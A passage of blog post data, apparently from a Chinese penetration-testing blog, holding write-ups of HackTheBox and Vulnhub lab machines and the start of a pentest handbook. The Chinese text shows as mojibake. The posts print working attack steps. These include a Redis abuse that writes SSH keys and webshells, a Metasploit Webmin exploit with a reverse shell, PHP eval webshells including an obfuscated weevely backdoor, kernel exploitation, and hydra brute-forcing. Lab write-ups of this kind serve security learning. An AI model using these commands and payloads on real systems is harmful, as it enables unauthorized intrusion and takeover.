(text/html; Charset=iso-8859-1).Aggressive OS guesses: Linux 3.2 - 4.9 (95%), Linux 3.1 (94%), Linux 3.2 (94%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), Linux 3.16 (93%), Linux 3.18 (93%), ASUS RT-N56U WAP (Linux 3.4) (93%), Android 4.1.1 (92%), Android 4.1.2 (92%), Android 4.2.2 (Linux 3.4) (92%)No exact OS matches for host (test conditions non-ideal). Webè·¯å¾„æšä¸¾ å°è¯•çˆ†ç ´80ç«¯å£ä¸‹çš„Webè·¯å¾„ æœªå‘ç°æœ‰æ•ˆä¿¡æ¯ æ¼æ´åˆ©ç”¨ å°è¯•ç›´æ¥ç™»å…¥redisæœåŠ¡ 1redis-cli -h 10.10.10.160 åˆ©ç”¨redisæœªæˆæƒå†™å…¥sshå¯†é’¥ï¼Œå†ç”¨sshç™»å…¥redisè´¦æˆ· 123456789rm -rf ~&#x2F;.ssh&#x2F;id*ssh-keygen -t rsa(echo -e &quot;\\n\\n&quot;;cat ~&#x2F;.ssh&#x2F;id_rsa.pub;echo -e &quot;\\n\\n&quot;) &gt; new.txtredis-cli -h 10.10.10.160 flushallcat new.txt | redis-cli -h 10.10.10.160 -x set crackitredis-cli -h 10.10.10.160 config set dir &#x2F;var&#x2F;lib&#x2F;redis&#x2F;.ssh&#x2F;redis-cli -h 10.10.10.160 config set dbfilename &quot;authorized_keys&quot;redis-cli -h 10.10.10.160 savessh -i &#x2F;root&#x2F;.ssh&#x2F;id_rsa redis@10.10.10.160 æ— æ³•åœ¨/var/www/html/ç›®å½•ä¸‹å†™å…¥WebShell å‘ç°æ–‡ä»¶/opt/id_rsa.bak 1234ls -l &#x2F;opttotal 4-rwxr-xr-x 1 Matt Matt 1743 Aug 26 00:11 id_rsa.bak å¯ä»¥ç¡®å®šæ˜¯Mattè´¦æˆ·çš„sshå¯†é’¥ æ‹·è´åˆ°æœ¬åœ°ä¹‹åå†ç”¨è„šæœ¬è½¬ä¸ºjohnå¯ä»¥ç ´è§£çš„å¯†ç å½¢å¼ 123&#x2F;usr&#x2F;share&#x2F;john&#x2F;ssh2john.py id_rsa.bak &gt; sshjohn --wordlist&#x3D;&#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt ssh computer2008 å¾—åˆ°Mattè´¦æˆ·çš„å£ä»¤ï¼Œä½¿ç”¨SSHç™»å…¥Mattè´¦æˆ· 12ssh Matt@10.10.10.160computer2008 æƒé™æå‡ åœ¨MSFä¸­æœç´¢Webminçš„ç›¸å…³æ¼æ´ 12345678910111213search webminMatching Modules&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; # Name Disclosure Date Rank Check Description - ---- --------------- ---- ----- ----------- 0 auxiliary&#x2F;admin&#x2F;webmin&#x2F;edit_html_fileaccess 2012-09-06 normal No Webmin edit_html.cgi file Parameter Traversal Arbitrary File Access 1 auxiliary&#x2F;admin&#x2F;webmin&#x2F;file_disclosure 2006-06-30 normal No Webmin File Disclosure 2 exploit&#x2F;linux&#x2F;http&#x2F;webmin_packageup_rce 2019-05-16 excellent Yes Webmin Package Updates Remote Command Execution 3 exploit&#x2F;unix&#x2F;webapp&#x2F;webmin_backdoor 2019-08-10 excellent Yes Webmin password_change.cgi Backdoor 4 exploit&#x2F;unix&#x2F;webapp&#x2F;webmin_show_cgi_exec 2012-09-06 excellent Yes Webmin &#x2F;file&#x2F;show.cgi Remote Command Execution 5 exploit&#x2F;unix&#x2F;webapp&#x2F;webmin_upload_exec 2019-01-17 excellent Yes Webmin Upload Authenticated RCE MSFä¸­è°ƒç”¨æ¼æ´åˆ©ç”¨å·¥å…· 12345678use exploit&#x2F;linux&#x2F;http&#x2F;webmin_packageup_rceset payload cmd&#x2F;unix&#x2F;reverse_netcatset LHOST 10.10.16.14set RHOSTS 10.10.10.160set USERNAME Mattset PASSWORD computer2008set SSL truerun è·å–rootæƒé™ 12iduid&#x3D;0(root) gid&#x3D;0(root) groups&#x3D;0(root) Redisç™»å…¥ä¹‹åï¼Œå¯ä»¥è€ƒè™‘å†™å…¥ä¸€å¥è¯åé—¨/phpinfoè¿™ä¸ªæ€è·¯ 1234config set dir &#x2F;var&#x2F;www&#x2F;html&#x2F;config set dbfilename shell.phpset webshell &quot;&lt;?php phpinfo(); ?&gt;&quot;save è€Œè¿™å°é¶æœºä¸­æ— æ³•åœ¨/var/www/html/ç›®å½•ä¸‹å†™å…¥æ–‡ä»¶ï¼Œææƒä¹Ÿæ¯”è¾ƒå›°éš¾ï¼Œåªèƒ½å†™å…¥SSHå¯†é’¥ é™„ï¼š Rediså¼±å£ä»¤æ¢æµ‹è„šæœ¬ 123456789101112131415161718192021222324252627# -*- coding:utf-8 -*-import socketimport sysPASSWORD_DIC&#x3D;[&#39;redis&#39;,&#39;root&#39;,&#39;oracle&#39;,&#39;password&#39;,&#39;p@aaw0rd&#39;,&#39;abc123!&#39;,&#39;123456&#39;,&#39;admin&#39;]def check(ip, port, timeout): try: socket.setdefaulttimeout(timeout) s &#x3D; socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((ip, int(port))) s.send(&quot;INFO\\r\\n&quot;) result &#x3D; s.recv(1024) if &quot;redis_version&quot; in result: return u&quot;æœªæˆæƒè®¿é—®&quot; elif &quot;Authentication&quot; in result: for pass_ in PASSWORD_DIC: s &#x3D; socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((ip, int(port))) s.send(&quot;AUTH %s\\r\\n&quot; %(pass_)) result &#x3D; s.recv(1024) if &#39;+OK&#39; in result: return u&quot;å­˜åœ¨å¼±å£ä»¤ï¼Œå¯†ç ï¼š%s&quot; % (pass_) except Exception, e: passif __name__ &#x3D;&#x3D; &#39;__main__&#39;: ip&#x3D;sys.argv[1] port&#x3D;sys.argv[2] print check(ip,port, timeout&#x3D;10) nmapæ‰«æé€Ÿåº¦å·¨æ…¢ï¼Œè€Œä¸”æ€»æ˜¯ä¼šæ‰«æ¼å‡ ä¸ªç«¯å£ï¼Œç”šè‡³æ‰«å…¨ç«¯å£æ—¶æ€»æ˜¯ä¼šä¸­é€”å› ä¸º900sçš„æ•°æ®åŒ…å»¶è¿Ÿè€Œä¸­æ–­æ‰«æâ€¦(ä½“éªŒæå·®) Redisçš„æ“ä½œå®Œå…¨æ²¡æœ‰æ¥è§¦è¿‡ï¼Œååˆ†ç”Ÿç– Webminçš„æ¼æ´åˆ©ç”¨å€’æ˜¯å¼‚å¸¸çš„é¡ºåˆ© å‚è€ƒèµ„æ–™ redis wp","categories":[{"name":"WriteUp","slug":"WriteUp","permalink":"https://yoloyolo.top/categories/WriteUp/"}],"tags":[{"name":"Pentest","slug":"Pentest","permalink":"https://yoloyolo.top/tags/Pentest/"},{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://yoloyolo.top/tags/HackTheBox/"}]},{"title":"Vulnhub_JANGOW_1.0.1","slug":"Vulnhub-JANGOW-1-0-1","date":"2023-02-14T11:59:27.000Z","updated":"2023-02-14T15:21:56.000Z","comments":true,"path":"2023/02/14/Vulnhub-JANGOW-1-0-1/","link":"","permalink":"https://yoloyolo.top/2023/02/14/Vulnhub-JANGOW-1-0-1/","excerpt":"Vulnhubå¹´é¶æœºæ•°é‡ Year Num â€¦ â€¦ 2018 65 2019 117 2020 223 2021 108 2022 1 éš¾å…å¯¹äºä¸€ä¸ªæ—¶ä»£çš„è½å¹•æ„Ÿåˆ°æƒ‹æƒœ ä½†åŒæ—¶åº†å¹¸è‡ªå·±èƒ½å¤Ÿåœ¨æœ€å¥½çš„æ—¶é—´å‚ä¸å…¶ä¸­ åœ¨å­¦ä¹ çš„è¿‡ç¨‹ä¸­äº«å—è¿™ä¸ªè¿‡ç¨‹ Thank you, Vulnhub &amp; every author. Thank you for what I learned and every wonderful challenge I enjoyed.","text":"Vulnhubå¹´é¶æœºæ•°é‡ Year Num â€¦ â€¦ 2018 65 2019 117 2020 223 2021 108 2022 1 éš¾å…å¯¹äºä¸€ä¸ªæ—¶ä»£çš„è½å¹•æ„Ÿåˆ°æƒ‹æƒœ ä½†åŒæ—¶åº†å¹¸è‡ªå·±èƒ½å¤Ÿåœ¨æœ€å¥½çš„æ—¶é—´å‚ä¸å…¶ä¸­ åœ¨å­¦ä¹ çš„è¿‡ç¨‹ä¸­äº«å—è¿™ä¸ªè¿‡ç¨‹ Thank you, Vulnhub &amp; every author. Thank you for what I learned and every wonderful challenge I enjoyed. JANGOW: 1.0.1 2023-02-14 06:59:27 ä¿¡æ¯æ”¶é›† IPæ¢æµ‹ nmap -sn 192.168.56.0/24 | grep -B 2 Virtual 123Nmap scan report for 192.168.56.118Host is up (0.00010s latency).MAC Address: 08:00:27:BF:BA:62 (Oracle VirtualBox virtual NIC) ç«¯å£æ‰«æ nmap -sV -Pn -v -T5 -A 192.168.56.118 12345678910111213141516171819202122232425Nmap scan report for 192.168.56.118Host is up (0.00016s latency).Not shown: 998 filtered tcp ports (no-response)PORT STATE SERVICE VERSION21/tcp open ftp vsftpd 3.0.380/tcp open http Apache httpd 2.4.18| http-methods: |_ Supported Methods: POST OPTIONS GET HEAD| http-ls: Volume /| SIZE TIME FILENAME| - 2021-06-10 18:05 site/|_|_http-server-header: Apache/2.4.18 (Ubuntu)|_http-title: Index of /MAC Address: 08:00:27:BF:BA:62 (Oracle VirtualBox virtual NIC)Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed portDevice type: general purposeRunning: Linux 3.X|4.XOS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4OS details: Linux 3.10 - 4.11, Linux 3.2 - 4.9Uptime guess: 0.041 days (since Tue Feb 14 06:38:08 2023)Network Distance: 1 hopTCP Sequence Prediction: Difficulty=263 (Good luck!)IP ID Sequence Generation: All zerosService Info: Host: 127.0.0.1; OS: Unix Webè·¯å¾„æšä¸¾ dirb http://192.168.56.118/ -w 123---- Scanning URL: http://192.168.56.118/ ----+ http://192.168.56.118/server-status (CODE:403|SIZE:279) ==&gt; DIRECTORY: http://192.168.56.118/site/ dirb http://192.168.56.118/site/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 123456---- Scanning URL: http://192.168.56.118/site/ ----==&gt; DIRECTORY: http://192.168.56.118/site/assets/ ==&gt; DIRECTORY: http://192.168.56.118/site/css/ + http://192.168.56.118/site/index.html (CODE:200|SIZE:10190) ==&gt; DIRECTORY: http://192.168.56.118/site/js/ ==&gt; DIRECTORY: http://192.168.56.118/site/wordpress/ æ¼æ´åˆ©ç”¨ è®¿é—®http://192.168.56.118/site/ ç‚¹å‡»å³ä¸Šè§’BuscaræŒ‰é’®è·³è½¬è‡³http://192.168.56.118/site/busque.php?buscar= ç®€å•æµ‹è¯•åå‘ç°å‘½ä»¤æ‰§è¡Œæ¼æ´ curl http://192.168.56.118/site/busque.php?buscar=ls 123456assetsbusque.phpcssindex.htmljswordpress ä»¥é˜²ä¸‡ä¸€ï¼Œç¡®è®¤ä¸€ä¸‹é»‘åå• curl 'http://192.168.56.118/site/busque.php?buscar=cat+./busque.php' 1&lt;?php system($_GET[&#x27;buscar&#x27;]); ?&gt; ç¡®è®¤å†™å…¥æƒé™ curl 'http://192.168.56.118/site/busque.php?buscar=ls+-la' 12345678910total 44drwxr-xr-x 6 www-data www-data 4096 Feb 13 17:59 .drwxr-xr-x 3 root root 4096 Oct 31 2021 ..-rw-r--r-- 1 www-data www-data 1584 Feb 13 17:59 \\drwxr-xr-x 3 www-data www-data 4096 Jun 3 2021 assets-rw-r--r-- 1 www-data www-data 35 Jun 10 2021 busque.phpdrwxr-xr-x 2 www-data www-data 4096 Jun 3 2021 css-rw-r--r-- 1 www-data www-data 10190 Jun 10 2021 index.htmldrwxr-xr-x 2 www-data www-data 4096 Jun 3 2021 jsdrwxr-xr-x 2 www-data www-data 4096 Jun 10 2021 wordpress curl 'http://192.168.56.118/site/busque.php?buscar=id' 1uid&#x3D;33(www-data) gid&#x3D;33(www-data) groups&#x3D;33(www-data) å°è¯•åå¼¹Shellï¼Œå¤±è´¥ å°è¯•é€šè¿‡WebæœåŠ¡ä¼ é€’Webshellï¼Œå¤±è´¥ ç–‘ä¼¼Banäº†ä¸»åŠ¨è¯·æ±‚ echo -n '&lt;?php eval($_POST[&quot;BFL&quot;]);?&gt;' | base64 1PD9waHAgZXZhbCgkX1BPU1RbIkJGTCJdKTs/Pg== 1curl &#x27;http://192.168.56.118/site/busque.php?buscar=echo+-n+PD9waHAgZXZhbCgkX1BPU1RbIkJGTCJdKTs/Pg==|base64+-d&gt;bfl.php&#x27; 12345678910111213141516weevely generate Bufferfly BFL.phpcat BFL.php | base64PD9waHAKJHo9JyRrPSI1TGJMMmNMMjhlTGMiOyRraD0iNDE1NmRiYUwwNTM1NyJMOyRrZj0iNzc3MmYxOEwyTDg1YWIiOyRwPSJMJzsKJGw9J2JhTHNlNjRfZW5jb2RlKEBMTHhMKExAZ3pjb21McHJMZXNzKCRvKSwkaykpO3ByaW50KCIkcCRraCRyJGtmIik7fSc7CiRBPSd0Y0xoKCIvJGtoKC4rKUwka0xmLyIsQGZpbGVfZ2V0X2NvbnRMZW50cygicExocDovTC9pbnB1dEwiKSwkbSk9JzsKJHE9J3JsZUxuKCRMdClMOyRvPSIiO2ZvcigkaUw9MDskaTwkbDtMTCl7Zm9Mcigkaj0wO0woJGo8JExjJiYkaTwkbCk7TCc7CiRUPSdMPTEpIEx7QG9MYl9zdGFydCgpTDtAZUx2YWwoQGd6dW5MY29tTHByZXNMcyhAeChAYkxhc2U2NExfZGVjb2RlKCQnOwokdD0nJGorTCssJGkrKyl7TCRvLj0kdEx7JGl9XiRreyRqfUw7fX1yZUx0dXJMbiAkbzt9aWYgTChAcHJlZ19MbUxMYSc7CiRkPXN0cl9yZXBsYWNlKCdTeicsJycsJ1N6Y3JlYXRTemVfU3pTemZTenVuU3pjdGlvbicpOwokWD0nbUxbTDFdKSwkaykpKTskTG89QG9MYl9nTGV0X2NvbnRMZW50THMoKTtAb2JfZW5MZF9jbGVMYW4oKTtMJHJMPUAnOwokdz0nRVZsNUx0dTJjNExKYXdDdXZrTEwiO2Z1bmN0aW9MbiB4KCR0LExMJGspeyRjPXN0ckxsTGVuKCRrKTskbD1zdCc7CiRmPXN0cl9yZXBsYWNlKCdMJywnJywkei4kdy4kcS4kdC4kQS4kVC4kWC4kbCk7CiRVPSRkKCcnLCRmKTskVSgpOwo/Pgo= 1curl &#x27;http://192.168.56.118/site/bfl.php&#x27; --data &quot;BFL=system(&#x27;echo -n PD9waHAKJHo9JyRrPSI1TGJMMmNMMjhlTGMiOyRraD0iNDE1NmRiYUwwNTM1NyJMOyRrZj0iNzc3MmYxOEwyTDg1YWIiOyRwPSJMJzsKJGw9J2JhTHNlNjRfZW5jb2RlKEBMTHhMKExAZ3pjb21McHJMZXNzKCRvKSwkaykpO3ByaW50KCIkcCRraCRyJGtmIik7fSc7CiRBPSd0Y0xoKCIvJGtoKC4rKUwka0xmLyIsQGZpbGVfZ2V0X2NvbnRMZW50cygicExocDovTC9pbnB1dEwiKSwkbSk9JzsKJHE9J3JsZUxuKCRMdClMOyRvPSIiO2ZvcigkaUw9MDskaTwkbDtMTCl7Zm9Mcigkaj0wO0woJGo8JExjJiYkaTwkbCk7TCc7CiRUPSdMPTEpIEx7QG9MYl9zdGFydCgpTDtAZUx2YWwoQGd6dW5MY29tTHByZXNMcyhAeChAYkxhc2U2NExfZGVjb2RlKCQnOwokdD0nJGorTCssJGkrKyl7TCRvLj0kdEx7JGl9XiRreyRqfUw7fX1yZUx0dXJMbiAkbzt9aWYgTChAcHJlZ19MbUxMYSc7CiRkPXN0cl9yZXBsYWNlKCdTeicsJycsJ1N6Y3JlYXRTemVfU3pTemZTenVuU3pjdGlvbicpOwokWD0nbUxbTDFdKSwkaykpKTskTG89QG9MYl9nTGV0X2NvbnRMZW50THMoKTtAb2JfZW5MZF9jbGVMYW4oKTtMJHJMPUAnOwokdz0nRVZsNUx0dTJjNExKYXdDdXZrTEwiO2Z1bmN0aW9MbiB4KCR0LExMJGspeyRjPXN0ckxsTGVuKCRrKTskbD1zdCc7CiRmPXN0cl9yZXBsYWNlKCdMJywnJywkei4kdy4kcS4kdC4kQS4kVC4kWC4kbCk7CiRVPSRkKCcnLCRmKTskVSgpOwo/Pgo= | base64 -d &gt; BFL.php&#x27;);&quot; weevely http://192.168.56.118/site/BFL.php Bufferfly ç®—æ˜¯è·å–äº†ä¸ªShellå§ æƒé™æå‡ cat user.txt d41d8cd98f00b204e9800998ecf8427e cat /var/www/html/.backup 123456789101112$servername = &quot;localhost&quot;;$database = &quot;jangow01&quot;;$username = &quot;jangow01&quot;;$password = &quot;abygurl69&quot;;// Create connection$conn = mysqli_connect($servername, $username, $password, $database);// Check connectionif (!$conn) &#123; die(&quot;Connection failed: &quot; . mysqli_connect_error());&#125;echo &quot;Connected successfully&quot;;mysqli_close($conn); cat /var/www/html/site/wordpress/config.php 1234567891011121314&lt;?php$servername = &quot;localhost&quot;;$database = &quot;desafio02&quot;;$username = &quot;desafio02&quot;;$password = &quot;abygurl69&quot;;// Create connection$conn = mysqli_connect($servername, $username, $password, $database);// Check connectionif (!$conn) &#123; die(&quot;Connection failed: &quot; . mysqli_connect_error());&#125;echo &quot;Connected successfully&quot;;mysqli_close($conn);?&gt; cat /etc/passwd | grep home 12syslog:x:104:108::&#x2F;home&#x2F;syslog:&#x2F;bin&#x2F;falsejangow01:x:1000:1000:desafio02,,,:&#x2F;home&#x2F;jangow01:&#x2F;bin&#x2F;bash netstaté‡Œé¢çœ‹è§äº†SSHï¼Œä½†æ˜¯è¿ä¸ä¸Šï¼Œä¼°è®¡æ˜¯é…iptablesäº† åœ¨Virtualboxä¸­ç™»å½•ï¼ˆå·çœ‹WPçš„ï¼‰ 12jangow01abygurl69 é€›ä¸€åœˆåæ²¡çœ‹è§ä»€ä¹ˆæœ‰ä»·å€¼çš„ä¿¡æ¯ uname -a 1Linux jangow01 4.4.0-31-generic #50-Ubuntu SMP Wed Jul 13 00:07:12 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux https://www.exploit-db.com/exploits/45010 æ–‡ä»¶ä¿å­˜åˆ°æœ¬åœ° ç¼–è¯‘ 1gcc exp.c -o exp weevelyä¸­ä¸Šä¼ å¹¶èµ‹æƒ 12:file_upload ./exp /tmp/expchmod +x /tmp/exp VirtualBoxç»ˆç«¯ä¸­jangow01ç”¨æˆ·è¿è¡Œ 1/tmp/exp cat /root/proof.txt 123456789101112131415161718192021222324252627282930 @@@&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;@@@@@@@@@@@@@@@&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp; @ @@@@@@@@@@@@@@@&amp;# #@@@@@@@@&amp;(. &#x2F;&amp;@@@@@@@@@@ @ @@@@@@@@@@&amp;( .@@@@@@@@&amp;%####((&#x2F;&#x2F;#&amp;@@@&amp; .&amp;@@@@@ @ @@@@@@@&amp; @@@@@@&amp;@@@@@&amp;%######%&amp;@* .&#x2F;@@* &amp;@@ @ @@@@@* (@@@@@@@@@#&#x2F;. .*@. .#&amp;. &amp;@@@&amp;&amp; @ @@@, &#x2F;@@@@@@@@#, .@. ,&amp;, @@&amp;&amp; @ @&amp; @@@@@@@@#. @@@,@@@&#x2F; %. #, %@&amp; @@@# @@@@@@@@&#x2F; .@@@@@@@@@@ * ., @@ @@&amp; @@@@@@@@* @@@@@@@@@@@ , @ @&amp; .@@@@@@@( @@@@@@@@@@@@@@@@@@@@@ *. &amp;@ @@&#x2F; *@@@@@@@&#x2F; @@@@@@@@@@@# @@ @@ .@@@@@@@&#x2F; @@@@@@@@@@@@@ @# @@ @@ @@@@@@@@. @@@@@@@@@@@ @@( @@ @&amp; .@@@@@@@@. , @@@@@@@ * .@@@*( .@ @@ ,@@@@@@@@, @@@@@@@@@&amp;*%@@@@@@@@@, @@@@@(%&amp;* &amp;@ @@&amp; @@@@@@@@@@@@@@@@@ (@@@@@@@@@@@@@@%@@&#x2F; &amp;@ @ @&amp; ,@@@@@@@@@@@@@@@,@@@@@@@&amp;%@@@@@@@@@@@@@@@%* &amp;@ @ @@. .@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%* &amp;@&amp; @ @@@&amp; ,@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%&#x2F; &amp;@@&amp;&amp; @ @@@@@@. *%@@@@@@@@@@@@@@@@@@@@&amp;#&#x2F;. &amp;@@@@&amp;&amp; @ @@@@@@@@&amp; JANGOW &amp;@@@ @ &amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;@@@&amp; @@(&amp;@ @. %.@ @@%@ &amp;@@@&amp;&amp;&amp;&amp; &amp;&amp;&amp;@@@@&amp;% &amp;&#x2F; (&amp;&amp;@@@&amp;&amp;&amp; (((((((((((((((((((((((((((((da39a3ee5e6b4b0d3255bfef95601890afd80709 ç½‘ç»œé—®é¢˜ 123456789101112131415161718192021222324252627282930313233iptables -L...Chain ufw-user-forward (1 references)target prot opt source destination Chain ufw-user-input (1 references)target prot opt source destination ACCEPT tcp -- anywhere anywhere tcp dpt:ftpACCEPT tcp -- anywhere anywhere tcp dpt:httpACCEPT udp -- anywhere anywhere udp dpt:httpChain ufw-user-limit (0 references)target prot opt source destination LOG all -- anywhere anywhere limit: avg 3&#x2F;min burst 5 LOG level warning prefix &quot;[UFW LIMIT BLOCK] &quot;REJECT all -- anywhere anywhere reject-with icmp-port-unreachableChain ufw-user-limit-accept (0 references)target prot opt source destination ACCEPT all -- anywhere anywhere Chain ufw-user-logging-forward (0 references)target prot opt source destination Chain ufw-user-logging-input (0 references)target prot opt source destination Chain ufw-user-logging-output (0 references)target prot opt source destination Chain ufw-user-output (1 references)target prot opt source destination ACCEPT tcp -- anywhere anywhere tcp dpt:httpsACCEPT udp -- anywhere anywhere udp dpt:https é…ç½®iptableæ¥Banæ‰åå¼¹Shellå€’æ˜¯ç¬¬ä¸€æ¬¡è§ï¼Œåœ¨è¿™ä¸Šé¢ä¹Ÿç¡®å®æµªè´¹äº†ä¸€äº›æ—¶é—´ æœ‰SSHä¸ç”¨éè¦ç”¨VirtualBoxç»ˆç«¯ç™»å½• éå¸¸è§„ï¼Œæœ‰ç‚¹æ•´æ´» 123456789101112131415localectl System Locale: LANG&#x3D;pt_BR.UTF-8 LANGUAGE&#x3D;pt_BR:pt:en LC_NUMERIC&#x3D;pt_BR LC_TIME&#x3D;pt_BR LC_MONETARY&#x3D;pt_BR LC_PAPER&#x3D;pt_BR LC_NAME&#x3D;pt_BR LC_ADDRESS&#x3D;pt_BR LC_TELEPHONE&#x3D;pt_BR LC_MEASUREMENT&#x3D;pt_BR LC_IDENTIFICATION&#x3D;pt_BR VC Keymap: n&#x2F;a X11 Layout: br X11 Model: a4techKB21 ä½†æ˜¯æ¯”ä¸Šæ¬¡çš„è¥¿è¯­é”®ç›˜å¥½æ‘ç‚¹ å‚è€ƒèµ„æ–™ WP","categories":[{"name":"WriteUp","slug":"WriteUp","permalink":"https://yoloyolo.top/categories/WriteUp/"}],"tags":[{"name":"Pentest","slug":"Pentest","permalink":"https://yoloyolo.top/tags/Pentest/"},{"name":"Vulnhub","slug":"Vulnhub","permalink":"https://yoloyolo.top/tags/Vulnhub/"}]},{"title":"é¶æœºæ¸—é€æ‰‹å†Œ","slug":"Drone-Pentest-Handbook","date":"2023-02-08T16:15:20.000Z","updated":"2023-03-01T17:19:59.496Z","comments":true,"path":"2023/02/08/Drone-Pentest-Handbook/","link":"","permalink":"https://yoloyolo.top/2023/02/08/Drone-Pentest-Handbook/","excerpt":"è¿Ÿæ¥çš„æ–‡ç« ","text":"è¿Ÿæ¥çš„æ–‡ç«  é¶æœºæ¸—é€æ‰‹å†Œ 2020/10/28 21:19:49 æƒ…æŠ¥æ”¶é›† å®é™…æ¸—é€ å…¨æµç¨‹ä¿¡æ¯æ”¶é›†æ–¹æ³•æ€»ç»“ æ¸—é€æµ‹è¯•ä¿¡æ¯æ”¶é›†å¿ƒå¾—åˆ†äº« é¶æœºæ¸—é€ æŸ¥æ‰¾IP ä¸»åŠæ–¹ç»™å‡º(æ¯”èµ›) netdiscover è·¯ç”±å™¨æŸ¥çœ‹ä¸»æœºIP(éœ€æƒé™) æ ¹æ®è™šæ‹ŸæœºIPåˆ†å¸ƒï¼Œç”¨æµè§ˆå™¨é€ä¸ªè®¿é—®IP(ä»…é™å­˜åœ¨WEBæœåŠ¡ï¼Œä¸æ¨è) nmap -sn -T5 192.168.0.0/24 | grep -B2 -E &quot;(virtual|VMware)&quot;(è™šæ‹Ÿæœºçš„MACåœ°å€) arp-scan -l ç«¯å£æ‰«æ nmap -p 1-65535 -sV -v -T5 -n 192.168.0.0 Webè·¯å¾„ dirb http://192.168.0.0/ -w gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .php -u http://192.168.0.1/ SMBä¿¡æ¯æšä¸¾ enum4linux 192.168.0.0 æ¼æ´åˆ†æ SSHå¼±å£ä»¤ FTPåŒ¿åç™»å…¥ SMBå¼±å£ä»¤ NFSç›®å½•æŒ‚è½½ WebæœåŠ¡æ¡†æ¶ Webçˆ†ç ´ LDAP Redisæœªæˆæƒ å…¶ä»–æ¼æ´ searchsploit æ¼æ´åˆ©ç”¨ SSHå¼±å£ä»¤ hydra -V -I -f -t 64 -L user -P pass ssh://192.168.0.0:22 FTPåŒ¿åç™»å…¥ 12ftp 192.168.0.1anonymous è·å–æ•æ„Ÿæ–‡ä»¶ FTP Banner SMBå¼±å£ä»¤ enum4limux 192.168.0.0 hydra -L user -P pass -I -e n smb://192.168.0.0 smbmap -H 192.168.0.0 smbclient //192.168.0.0/dir -U username ä½¿ç”¨smbclientç™»å…¥æ—¶éœ€è¦ç¡®ä¿è·¯å¾„/ç”¨æˆ·å/å£ä»¤éƒ½æ­£ç¡® NFSç›®å½•æŒ‚è½½ 123456789101112apt-get install nfs-commonvim /etc/exports /share1 *(sync,ro) 192.168.0.0(sync,rw)systemctl restart rpcbindsystemctl restart nfsshowmount -e 192.168.0.0 Export list for 192.168.0.0: /home/peter *mkdir /mnt/share1mount -t nfs 192.168.0.0:/home/peter /mnt/share1cd /mnt/share1ls Webæ¡†æ¶ drupal : RCE(https://github.com/dreadlocked/Drupalgeddon2) wordpress : wpscan â€“ https://www.exploit-db.com/ | searchsploit wpscan --url http://192.168.0.0/ -e ap --plugins-detection Aggressive Appearance -&gt; Editor -&gt; 404.php: /wp-content/twentyfourteen/404.php webmin : MSF(exploit/linux/http/webmin_packageup_rce) robots.txt struts2æ¼æ´ flask SSTI Webçˆ†ç ´ Webé¡µé¢å†…å®¹ç”Ÿæˆå­—å…¸ : cewl http://192.168.31.39/websec -w pass hydra-post-form : hydra -I -l contact@hacknos.com -P FuzzDicts-master/passwordDict/top6000.txt -vV -f 192.168.31.39 http-post-form &quot;/websec/login:username=^USER^&amp;password=^PASS^:Wrong&quot; JWT : https://github.com/brendan-rius/c-jwt-cracker 123456.&#x2F;jwtcrack eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFhYSJ9.Xjc37g2j_pU5SFHYwoPSHWJDEmRVPtfHkbFfGPcn4W0pip install pyjwtpython&gt;&gt;&gt; import jwt&gt;&gt;&gt; jwt.encode(&#123;&#39;username&#39;: &#39;admin&#39;&#125;, &#39;1Kun&#39;, algorithm&#x3D;&#39;HS256&#39;)&#39;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.40on__HQ8B2-wM1ZSwax3ivRK4j54jlaXv-1JjQynjo&#39; HTTP-Basicè®¤è¯ é…åˆBurpçš„Intruderæ¨¡å— å­—å…¸ç”Ÿæˆè„šæœ¬ 12345678910111213141516171819202122#test.pyimport base64raw = [ &#x27;Recon&#x27;, &#x27;Web&#x27;, &#x27;Home&#x27;, &#x27;Service&#x27;, &#x27;Blog&#x27;, &#x27;hackNos&#x27;, &#x27;TroubleShoot&#x27;, &#x27;Security&#x27;, &#x27;Recon Security&#x27;, &#x27;Secure&#x27;, &#x27;root&#x27;, &#x27;5ecure&#x27;, &#x27;admin&#x27;, &#x27;Secure@hackNos&#x27;, &#x27;Security@hackNos&#x27;, &#x27;&#x27;]for i in raw: for j in raw: print base64.b64encode(j + &#x27;:&#x27; + i) LDAP nmap 192.168.0.0 -p 389 --script ldap-search --script-args 'ldap.username=&quot;cn=admin,dc=admin,dc=local&quot;,ldap.password=password' Redisæœªæˆæƒ phpæ–‡ä»¶ 1234config set dir /var/www/html/config set dbfilename shell.phpset webshell &quot;&lt;?php phpinfo(); ?&gt;&quot;save SSHç§˜é’¥ 123456789rm -rf ~/.ssh/id*ssh-keygen -t rsa(echo -e &quot;\\n\\n&quot;;cat ~/.ssh/id_rsa.pub;echo -e &quot;\\n\\n&quot;) &gt; new.txtredis-cli -h 192.168.0.0 flushallcat new.txt | redis-cli -h 1192.168.0.0 -x set crackitredis-cli -h 192.168.0.0 config set dir /var/lib/redis/.ssh/redis-cli -h 192.168.0.0 config set dbfilename &quot;authorized_keys&quot;redis-cli -h 192.168.0.0 savessh -i /root/.ssh/id_rsa redis@192.168.0.0 å…¶ä»–æ¼æ´ gitä¿¡æ¯æ³„éœ² : githack DS_Storeæ–‡ä»¶æ³„éœ² : ds_store_exp SMTP + LFI = GetShell 123456789telnet 192.168.0.0 